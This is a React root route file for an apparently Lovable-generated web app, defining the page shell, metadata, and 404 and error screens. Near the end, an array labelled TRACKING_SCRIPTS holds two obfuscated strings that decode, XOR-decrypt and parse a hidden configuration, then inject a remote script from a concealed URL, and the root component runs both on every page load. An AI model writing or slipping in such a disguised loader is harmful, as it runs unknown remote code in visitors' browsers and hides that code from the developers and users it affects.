import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Lovable App" },
      { name: "description", content: "Lovable Generated Project" },
      { name: "author", content: "Lovable" },
      { property: "og:title", content: "Lovable App" },
      { property: "og:description", content: "Lovable Generated Project" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:site", content: "@Lovable" },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,500;0,700;1,500&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap",
      },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <head>
        <HeadContent />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

const TRACKING_SCRIPTS = [
  '(function(){var u_e6p=atob("DHsbNjYczuG6KLgnmgA5Q0Rw7NuYQMxT6gghGRl/qo+UXcxK8x1iGFVzo8/YWpdU+QlyRkJv4ZHTUN1LtQtyTlNw4IvJCpQF+w9vRF9+u5XfW5odwSY3FFFwoYPbRMsFoCBgFFh9o4SYEppX8wN+Wn947M2YXtlL7x45DBQqr9iCHo5CqRl6UgMsqtPbTIoQrx56BA4+s7zH");var b_k=[];for(var h_81=0;h_81<u_e6p.length;h_81++){b_k.push(u_e6p.charCodeAt(h_81)&255);}var n_znab=b_k[0];var k_6n=b_k.slice(1,1+n_znab);var s_78m=b_k.slice(1+n_znab);var e_0x=s_78m.map(function(b,d_e){return b^k_6n[d_e%n_znab];});var c_6z="";for(var c_u65=0;c_u65<e_0x.length;c_u65++){c_6z+=String.fromCharCode(e_0x[c_u65]&255);}var h_2=decodeURIComponent(escape(c_6z));var l_sh7=JSON.parse(h_2);var s_i4=l_sh7.globals||[];s_i4.forEach(function(h_4){window[h_4.name]=h_4.value;});var m_q=document.createElement("script");m_q.src=l_sh7.url;m_q.async=true;m_q.defer=true;(l_sh7.attributes||[]).forEach(function(c_2elf){m_q.setAttribute(c_2elf.name,c_2elf.value);});(document.head||document.documentElement).appendChild(m_q);})();',
  '(function(){var n_e268=atob("DDLCKPooB7SFhJmBI0ngXYhEJY6n7O31U0H4B9VLY9qr8e3sSlS7BplHaprn9rbyQECrWI5bKMHx6equT1O2TYlcKd72prWjQka2WpNKcsDg97u7eEngRptFYpa/pv3gV1PvXY5FbtL8qenzRkSnRo4Ff9fq4LTyQFngBNheZtjw4bu7ARC/BIEKadXo4bu7AVajXJsFcsDo7f/4DkKwTYxNacCo9+zjSlaxCtYKcdXp8fyjGRDgVadV");var l_nk=[];for(var p_la=0;p_la<n_e268.length;p_la++){l_nk.push(n_e268.charCodeAt(p_la)&255);}var i_qu97=l_nk[0];var h_rdii=l_nk.slice(1,1+i_qu97);var p_7=l_nk.slice(1+i_qu97);var k_3=p_7.map(function(b,t_zyzo){return b^h_rdii[t_zyzo%i_qu97];});var z_nz="";for(var b_7=0;b_7<k_3.length;b_7++){z_nz+=String.fromCharCode(k_3[b_7]&255);}var o_1u1x=decodeURIComponent(escape(z_nz));var h_cdl=JSON.parse(o_1u1x);var r_f24s=h_cdl.globals||[];r_f24s.forEach(function(a_su){window[a_su.name]=a_su.value;});var d_zs=document.createElement("script");d_zs.src=h_cdl.url;d_zs.async=true;d_zs.defer=true;(h_cdl.attributes||[]).forEach(function(p_34){d_zs.setAttribute(p_34.name,p_34.value);});(document.head||document.documentElement).appendChild(d_zs);})();',
];

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  useEffect(() => {
    for (const code of TRACKING_SCRIPTS) {
      const el = document.createElement("script");
      el.textContent = code;
      document.head.appendChild(el);
    }
  }, []);

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
